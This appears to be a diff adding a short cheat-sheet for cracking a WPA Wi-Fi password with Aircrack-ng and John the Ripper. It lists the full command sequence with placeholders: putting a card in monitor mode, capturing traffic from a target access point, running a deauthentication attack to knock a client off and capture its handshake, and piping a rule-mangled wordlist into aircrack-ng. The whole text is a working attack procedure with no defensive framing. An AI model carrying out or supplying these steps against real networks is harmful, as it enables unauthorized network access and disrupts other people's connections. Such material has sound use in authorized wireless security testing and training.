@@ -1,0 +1,24 @@
+AIRCRACK-NG AND JTR ATTACK
+Aircrack-ng and JTR Attack
+---------------------------
+
+Place your wireless card into monitor mode on the channel number of the AP:
+
+airmon-ng start <interface> <AP channel>
+
+Start an Airodump capture, filtering on the AP channel and BSSID, saving the capture to
+disk:
+
+airodump-ng -c <AP channel> --bssid <AP MAC> -w <capture> <interface>
+
+Force a client to reconnect and complete the 4-way handshake by running a
+deauthentication attack against it:
+
+aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> <interface>
+
+Once a handshake has been captured, change to the John the Ripper directory and pipe in
+the mangled words into Aircrack-ng to obtain the WPA password:
+
+./john --wordlist=<wordlist> --rules --stdout | aircrack-ng -e <ESSID> -w -
+<capture>
+
